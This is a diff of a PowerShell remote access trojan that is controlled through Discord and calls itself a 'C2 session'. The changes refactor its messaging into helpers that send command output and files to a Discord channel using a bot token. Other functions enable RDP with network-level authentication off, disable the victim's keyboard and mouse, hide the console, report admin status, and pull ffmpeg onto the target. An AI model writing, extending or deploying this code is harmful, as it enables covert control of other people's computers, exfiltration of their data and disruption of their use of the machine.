 Function EnableRDP {
     Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
     Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
     Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``RDP Enabled`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``RDP Enabled`` :white_check_mark:"
 }
 
 Function EnableIO{
-$PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
-$PNPMice.Enable()
-$PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
-$PNPKeyboard.Enable()
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``IO Enabled`` :white_check_mark:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
+    $PNPMice.Enable()
+    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
+    $PNPKeyboard.Enable()
+    sendMsg -Message ":white_check_mark: ``IO Enabled`` :white_check_mark:"
 }
 
 Function DisableIO{
-$PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
-$PNPMice.Disable()
-$PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
-$PNPKeyboard.Disable()
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
+    $PNPMice.Disable()
+    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
+    $PNPKeyboard.Disable()
+    sendMsg -Message ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"
 }
 
 # =============================================================== MAIN FUNCTIONS =========================================================================
 
 Function WaitingMsg {
-$jsonPayload = @{
+$script:jsonPayload = @{
+    username   = $env:COMPUTERNAME
     tts        = $false
     embeds     = @(
         @{
             title       = "$env:COMPUTERNAME | Waiting to connect "
             "description" = @"
-Enter **$env:COMPUTERNAME** In Chat To Start    
+Enter **$env:COMPUTERNAME** in chat to start the session     
 "@
-            color       = 16711680
-            author      = @{
-                name     = "egieb"
-                url      = "https://github.com/beigeworm"
-                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
-            }
+            color       = 16776960
             footer      = @{
                 text = "$timestamp"
             }
         }
     )
 }
-$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
-Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
+sendMsg -Embed $jsonPayload
+}
+
+Function CloseMsg {
+$script:jsonPayload = @{
+    username   = $env:COMPUTERNAME
+    tts        = $false
+    embeds     = @(
+        @{
+            title       = "$env:COMPUTERNAME | Session Closed "
+            "description" = @"
+**$env:COMPUTERNAME** Closing session     
+"@
+            color       = 16711680
+            footer      = @{
+                text = "$timestamp"
+            }
+        }
+    )
+}
+sendMsg -Embed $jsonPayload
 }
 
 Function ConnectMsg {
-$jsonPayload = @{
+
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+    $adminperm = "False"
+} else {
+    $adminperm = "True"
+}
+
+$script:jsonPayload = @{
+    username   = $env:COMPUTERNAME
     tts        = $false
     embeds     = @(
         @{
             title       = "$env:COMPUTERNAME | C2 session started!"
             "description" = @"
-**Enter Commands In Chat**
+Admin Session    : ``$adminperm``
+Session Started  : ``$timestamp``
 
-Try : ``options`` for a list of commands
-Try : ``extrainfo`` for command exapmples
-Use : ``pause`` to pause the session on the target
-Use : ``close`` to stop the session on the target    
+**Enter Commands In Chat**
+- **Options**: A list of commands
+- **ExtraInfo**: Various command examples
+- **Pause**: Pause the session on the target
+- **Close**: Close the session
 "@
-            color       = 16711680
-            author      = @{
-                name     = "egieb"
-                url      = "https://github.com/beigeworm"
-                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
-            }
-            footer      = @{
-                text = "$timestamp"
-            }
+            color       = 65280
         }
     )
 }
-$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
-Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
+sendMsg -Embed $jsonPayload
 }
 
 function PullMsg {
@@ -1180,9 +1119,64 @@ function PullMsg {
     }
 }
 
+
+function sendMsg {
+    param(
+        [string]$Message,
+        [string]$Embed
+    )
+
+    $url = "https://discord.com/api/v9/channels/$chan/messages"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", "Bot $token")
+
+    if ($Embed) {
+        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
+        $webClient.Headers.Add("Content-Type", "application/json")
+        $response = $webClient.UploadString($url, "POST", $jsonBody)
+        Write-Host "Embed sent to Discord"
+        $jsonPayload = $null
+    }
+
+    if ($Message) {
+        $limitedMessage = $Message
+        if ($Message.Length -gt 1999) {
+            $limitedMessage = $Message.Substring(0, 1999)
+        }
+        $jsonBody = @{
+            "username" = "$env:COMPUTERNAME"
+            content = $limitedMessage
+        } | ConvertTo-Json
+        $webClient.Headers.Add("Content-Type", "application/json")
+        $response = $webClient.UploadString($url, "POST", $jsonBody)
+        Write-Host "Message sent to Discord"
+        $Message = $null
+    }
+
+}
+
+
+function sendFile {
+    param(
+        [string]$sendfilePath
+    )
+
+    $url = "https://discord.com/api/v9/channels/$chan/messages"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", "Bot $token")
+    if ($sendfilePath) {
+        if (Test-Path $sendfilePath -PathType Leaf) {
+            $response = $webClient.UploadFile($url, "POST", $sendfilePath)
+            Write-Host "Attachment sent to Discord: $sendfilePath"
+        } else {
+            Write-Host "File not found: $sendfilePath"
+            Send-Discord ('File not found: `' + $sendfilePath + '`')
+        }
+    }
+}
+
 Function GetFfmpeg{
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Downloading FFmpeg to Client..`` :mag_right:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":mag_right: ``Downloading FFmpeg to Client..`` :mag_right:"
     $Path = "$env:Temp\ffmpeg.exe"
     If (!(Test-Path $Path)){  
         $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
@@ -1195,8 +1189,7 @@ Function GetFfmpeg{
         Remove-Item -Path $zipFilePath -Force
         Remove-Item -Path $extractedDir -Recurse -Force
     }
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Download Complete`` :white_check_mark:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Download Complete`` :white_check_mark:"
 }
 
 Function HideConsole{
@@ -1269,22 +1262,19 @@ while($true){
         if($authenticated -ne 1){
             if ($response -like "ShowAll") {
 	    	$previouscmd = $response   
-    		$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``````Session Waiting : $env:COMPUTERNAME``````"} | ConvertTo-Json
-    		Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    		sendMsg -Message "``````Session Waiting : $env:COMPUTERNAME``````"
      	    }
      	}
         if($authenticated -eq 1){
             if ($response -like "close") {
                 $previouscmd = $response        
-                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Closing Session.`` :octagonal_sign:"} | ConvertTo-Json
-                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+                CloseMsg
                 break
             }
             if ($response -like "Pause") {
                 $script:authenticated = 0
                 $previouscmd = $response        
-                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":pause_button: ``Session Paused..`` :pause_button:"} | ConvertTo-Json
-                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+                sendMsg -Message ":pause_button: ``Session Paused..`` :pause_button:"
                 WaitingMsg
             }
             elseif (!($response -like "$previouscmd")) {
@@ -1294,8 +1284,7 @@ while($true){
                 }
                 else{
                     $script:previouscmd = $response
-                    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``````$Result``````"} | ConvertTo-Json
-                    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+                    sendMsg -Message "``````$Result``````"
                 }
             }
         }
